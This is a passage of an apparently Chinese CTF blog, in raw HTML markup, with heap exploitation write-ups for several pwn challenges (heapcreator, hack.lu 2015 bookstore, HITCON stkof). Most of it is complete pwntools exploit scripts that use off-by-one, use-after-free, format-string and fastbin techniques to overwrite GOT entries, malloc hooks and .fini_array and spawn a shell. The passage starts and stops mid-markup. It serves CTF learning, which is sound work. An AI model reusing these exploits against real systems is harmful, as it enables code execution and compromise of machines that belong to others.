class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./vn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)</span><br><span class="line">gdb.attach(p) </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;:&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line"> p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"> p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">create(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + <span class="string">b&#x27;\xc1&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"> </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x48</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line">leak_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">realloc_hook = libc_base + libc.sym[<span class="string">&#x27;__realloc_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc_hook:&quot;</span>+<span class="built_in">hex</span>(realloc_hook))</span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;realloc:&quot;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook-<span class="number">27</span>-<span class="number">8</span>)+<span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line"> </span><br><span class="line">one = <span class="number">0x4527a</span></span><br><span class="line">onegadget = libc_base + one</span><br><span class="line">log.info(<span class="string">&quot;one:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span> + p64(onegadget) + p64(realloc+<span class="number">12</span>) + <span class="string">b&#x27;\n&#x27;</span><span class="comment">#这两个换行很重要,没有换行就会卡住不知道为什么</span></span><br><span class="line">edit(<span class="number">5</span>,payload)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendafter(<span class="string">b&quot;choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;?&#x27;</span>,<span class="built_in">str</span>(<span class="number">0x10</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line">-----------------------又或者另一个有微小差异的版本--------------------------------------</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r=process(<span class="string">&#x27;./vn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">        r.sendafter(<span class="string">b&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">        r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">        r.send(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">        r.sendafter(<span class="string">b&quot;idx?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">b&#x27;a&#x27;</span>)<span class="comment">#3 阻断top chunk</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">leak=u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">libc_base=leak-(<span class="number">0x3c4b78</span>)</span><br><span class="line"></span><br><span class="line">realloc_addr=libc_base+libc.sym[<span class="string">&#x27;__libc_realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_chunk_addr=malloc_hook-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(realloc_addr))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(fake_chunk_addr))</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment"># 4与2同时指向0x70</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(fake_chunk_addr)+<span class="string">b&#x27;\n&#x27;</span>)<span class="comment">#换行依然很重要</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x08</span>)<span class="comment">#4</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">0x08</span>)+p64(one_gadget)+p64(realloc_addr+<span class="number">12</span>)</span><br><span class="line">add(<span class="number">0x68</span>,payload)<span class="comment">#5</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;choice: &quot;</span>)</span><br><span class="line">r.send(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">r.sendafter(<span class="string">b&quot;size?&quot;</span>,<span class="built_in">str</span>(<span class="number">0x18</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行有小几率会发生段错误，并且gdb无法获取符号表，不知道为什么[<u>无法获取符号表已解决见小记0x6</u>]</p><p>有几处一定要加换行符,大概是因为程序中的edit函数中的read是一个字节一个字节读入的,故空字符会使得read等待输入,而不是继续往下执行直到退出,故需要换行符来触发退出.</p><p><strong>小记0x4</strong></p><h2 id="HITCON-Trainging-lab13-heapcreator"><a href="#HITCON-Trainging-lab13-heapcreator" class="headerlink" title="HITCON Trainging lab13 heapcreator"></a>HITCON Trainging lab13 heapcreator</h2><p><strong>难度:★</strong></p><p>核心利用依然是off-by-one，且off-by-one大概率和chunk-extend利用有关</p><p>这次可以利用off-by-one漏洞达到任意写任意读的目的</p><p>读哪里写哪里是一个关键</p><p>因为程序没有开启pie,所以可以直接得到某个函数的got表地址,此外,got表可修改</p><p>比较方便的利用是修改free的got表</p><p>然后先读出free真实地址以此得到libc基址</p><p>然后再修改free为system函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25919)#这道题在buuctf也能找到</span></span><br><span class="line">p=process(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./hc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(size)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(idx)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">create(<span class="string">b&#x27;24&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="string">b&#x27;16&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="string">b&#x27;0&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">16</span>+<span class="string">b&#x27;\x41&#x27;</span>)</span><br><span class="line">delete(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#free后，原先的contentchunk和头chunk被挂入fastbin，且由于大小合适contentchunk会被取出作为新的头chunk，这样新的头chunk和contentchunk的位置就对调了，从而可写content指针</span></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">100</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">create(<span class="string">b&#x27;48&#x27;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">base=free_addr-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system_addr=base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">edit(<span class="string">b&#x27;1&#x27;</span>,p64(system_addr))</span><br><span class="line">p.send(<span class="string">b&#x27;4&#x27;</span>)   <span class="comment">#这里不用delete函数是因为跳转到执行system后,就接收不到数据了,recv会堵塞卡住</span></span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这题唯一需要注意的就是<strong>确定free-got表这个利用点</strong>,因为free的参数是一个可写指针,这样再修改为system函数,参数就可控了</p><p>而恰好这道题没有pie且got表可写,free-got表是最快捷的突破点,至于修改hook什么的也能做到不过要多花一些功夫</p><h2 id="2015-hacklu-bookstore"><a href="#2015-hacklu-bookstore" class="headerlink" title="2015 hacklu bookstore"></a>2015 hacklu bookstore</h2><p><strong>难度:★★★</strong></p><p>难度不小，非常综合的一题，要用到不少知识</p><p>程序没有开relro和pie</p><p>程序比较易发现的漏洞有</p><ol><li>无限读，程序在读取内容时是仅以出现换行符来判断结束的</li><li>程序在free后没有设置NULL，故存在UAF</li><li>程序结尾存在一个格式字符串漏洞</li></ol><p>写的能力全部在格式化字符串上</p><p>核心关键点在于修改了book2的size后在释放,使得submit获得的chunk就为book2,从而使的dest被overlap以达到控制格式化字符串的目的</p><p>其中book1的内容的控制也算十分精妙</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">我们需要让printf堆块处执行格式化的漏洞，就需要让submit功能去帮助我们覆盖，submit功能会加上order1:等这些字符串，不能漏掉，总结后可以得知新申请的堆块内容为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + chunk2 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">因为chunk2已经被delete掉了，所以当复制chunk2中的内容的时候复制的其实是order 1: + chunk1。所以上述可以变为：</span><br><span class="line"></span><br><span class="line">Order 1: + chunk1 + \n + Order 2: + Order 1: + chunk1 + \n</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">所以我们可以构造第二次的chunk1内容恰好覆盖到dest堆块处。也就是：</span><br><span class="line"></span><br><span class="line">size(Order 1: + chunk1 + \n + Order 2: + Order 1:) == 0x90</span><br><span class="line"></span><br><span class="line">size(chunk1) == 0x90 - 28 == 0x74</span><br></pre></td></tr></table></figure><p>然而单单一次格式化字符串显然并不能达到目的</p><p>故而又要想方设法做到二次利用</p><p>最好的方法自然是.fini_array的利用</p><p>且这道题.fini_array的返回地址恰好与一个onegadget相近,剩下的就都是常规套路了</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./books&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit1</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter first order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit2</span>(<span class="params">content</span>) :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Enter second order:\n&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete2</span>() :</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">b&quot;%2617c%13$hn.%31$p,%28$p&quot;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload)</span><br><span class="line"> </span><br><span class="line">payload2 = <span class="string">b&#x27;5&#x27;</span>+p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="comment">#leak --&gt; libc_base</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x2e&#x27;</span>)</span><br><span class="line">data = p.recv(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;,&#x27;</span>)</span><br><span class="line">ret_addr = p.recv(<span class="number">14</span>)</span><br><span class="line">data = <span class="built_in">int</span>(data,<span class="number">16</span>) - <span class="number">240</span></span><br><span class="line">ret_addr = <span class="built_in">int</span>(ret_addr,<span class="number">16</span>) + <span class="number">0x28</span> - <span class="number">0x210</span></span><br><span class="line">libc_base = data - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&#x27;ret_addr :&#x27;</span>+<span class="built_in">hex</span>(ret_addr))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#repeat --&gt; change ret_addr --&gt; system_addr(one_gadget)</span></span><br><span class="line">one_shot = libc_base + <span class="number">0x45226</span></span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(one_shot))</span><br><span class="line">one_shot1 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">2</span>:]</span><br><span class="line">one_shot2 = <span class="string">&#x27;0x&#x27;</span>+<span class="built_in">hex</span>(one_shot)[-<span class="number">6</span>:-<span class="number">2</span>]</span><br><span class="line"><span class="built_in">print</span> (one_shot1,one_shot2)</span><br><span class="line">one_shot1 = <span class="built_in">int</span>(one_shot1,<span class="number">16</span>)</span><br><span class="line">one_shot2 = <span class="built_in">int</span>(one_shot2,<span class="number">16</span>)</span><br><span class="line"> </span><br><span class="line">delete2()</span><br><span class="line"> </span><br><span class="line">payload3 = <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%13$hhn&#x27;</span>.<span class="built_in">format</span>(one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="built_in">bytes</span>(<span class="string">&#x27;%&#123;&#125;d%14$hn&#x27;</span>.<span class="built_in">format</span>(one_shot2-one_shot1),<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">payload3 += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p8(<span class="number">0x0</span>)*(<span class="number">0x88</span>-<span class="built_in">len</span>(payload3))</span><br><span class="line">payload3 += p64(<span class="number">0x151</span>)</span><br><span class="line">edit1(payload3)</span><br><span class="line"> </span><br><span class="line">payload4 = <span class="string">b&#x27;5&#x27;</span> + p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(ret_addr) + p64(ret_addr+<span class="number">1</span>)</span><br><span class="line">p.sendline(payload4)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x5-0x6</strong></p><h2 id="2014-HITCON-stkof"><a href="#2014-HITCON-stkof" class="headerlink" title="2014 HITCON stkof"></a>2014 HITCON stkof</h2><p><strong>难度:★★</strong></p><p>非常经典的unlink题目</p><p>其最大的利用点是其edit功能无大小限制,可以读取任意大小数据,依此可以做到覆盖下一个chunk的prev_size和size,从而达到unlink的功能</p><p><strong>注意点1:</strong>这题的第一次o操作是在第一个chunk申请后,也就是说第一个我们申请的chunk的后面会是一个stdout的缓冲区,是我们无法利用的,因此需一个chunk引出ochunk,之后正常利用</p><p><strong>注意点2:</strong>这题没有任何能够输出有效信息的功能,故而一切有效利用信息,都需要通过基于unlink实现的改写got表,通过puts函数泄露信息,最后wiki选择的是修改atoi函数为system,但我选择的再次修改free_got,另外wiki的exp最后好像有一点问题..</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 